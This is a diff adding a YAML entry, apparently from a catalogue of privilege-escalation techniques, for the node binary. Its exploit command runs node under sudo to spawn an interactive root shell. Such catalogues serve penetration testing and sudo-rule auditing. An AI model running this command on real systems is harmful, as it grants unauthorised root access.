@@ -1,0 +1,5 @@
+name: node
+binary_path: /usr/bin/node
+exploit_cmds:
+- 'sudo /usr/bin/node -e ''require("child_process").spawn("/bin/sh", {stdio: [0, 1,
+  2]})'''
